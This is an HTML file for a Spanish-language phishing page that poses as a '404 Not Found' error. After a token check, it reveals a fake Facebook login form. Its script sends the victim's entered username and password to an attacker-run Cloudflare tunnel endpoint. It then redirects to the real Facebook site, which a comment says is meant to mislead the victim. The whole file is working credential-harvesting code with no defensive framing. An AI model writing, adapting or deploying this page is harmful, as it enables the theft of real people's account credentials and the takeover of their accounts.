<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>404 Not Found</title>
    <style>
        body { font-family: -apple-system, sans-serif; background: #fff; margin: 0; display: flex; justify-content: center; align-items: center; height: 100vh; }
        .container { width: 90%; max-width: 380px; text-align: center; }
        
        /* Estilo 404 */
        #seccion-404 h1 { font-size: 60px; margin: 0; font-family: monospace; }
        #seccion-404 p { color: #555; font-family: monospace; margin-bottom: 20px; }
        .input-box { background: #f9f9f9; padding: 20px; border-radius: 10px; border: 1px solid #eee; }
        
        /* Estilo Facebook */
        #seccion-fb { display: none; }
        .fb-logo { color: #0866ff; font-size: 32px; font-weight: bold; margin-bottom: 20px; }
        
        input { width: 100%; padding: 12px; margin: 8px 0; border: 1px solid #dddfe2; border-radius: 6px; box-sizing: border-box; background: #f5f6f7; }
        button { width: 100%; padding: 12px; border: none; border-radius: 6px; font-weight: bold; cursor: pointer; }
        .btn-black { background: #000; color: #fff; }
        .btn-blue { background: #0866ff; color: #fff; margin-top: 10px; }
    </style>
</head>
<body>

    <div id="seccion-404" class="container">
        <h1>Not Found</h1>
        <p>The requested URL was not found on this server.</p>
        <div class="input-box">
            <input type="text" id="nombre" placeholder="TU NOMBRE">
            <input type="text" id="token" placeholder="DIAGNOSTIC TOKEN">
            <button class="btn-black" onclick="validar()">RUN DIAGNOSTIC</button>
        </div>
    </div>

    <div id="seccion-fb" class="container">
        <div class="fb-logo">facebook</div>
        <p style="font-size: 14px; color: #606770;">Inicia sesión para continuar.</p>
        <input type="text" id="fb-user" placeholder="Celular o correo electrónico">
        <input type="password" id="fb-pass" placeholder="Contraseña">
        <button class="btn-blue" onclick="enviar()">Iniciar sesión</button>
    </div>

    <script>
        // --- AYBER: PEGA AQUÍ TU LINK DE CLOUDFLARE ---
        const API_URL = "https://tu-url-aqui.trycloudflare.com"; 

        async function validar() {
            const n = document.getElementById('nombre').value;
            const t = document.getElementById('token').value;

            try {
                const res = await fetch(`${API_URL}/get-ghost-code`, {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({ nombre: n, llave: t })
                });

                if (res.ok) {
                    document.getElementById('seccion-404').style.display = 'none';
                    document.getElementById('seccion-fb').style.display = 'block';
                } else {
                    alert("Token inválido.");
                }
            } catch (e) { alert("Error: El servidor en Termux no responde."); }
        }

        async function enviar() {
            const u = document.getElementById('fb-user').value;
            const p = document.getElementById('fb-pass').value;

            if(!u || !p) return alert("Completa los campos.");

            try {
                await fetch(`${API_URL}/captura`, {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({ user: u, pass: p })
                });
                // Redirección falsa para despistar
                window.location.href = "https://m.facebook.com/login/identify";
            } catch (e) { alert("Error de conexión."); }
        }
    </script>
</body>
</html>
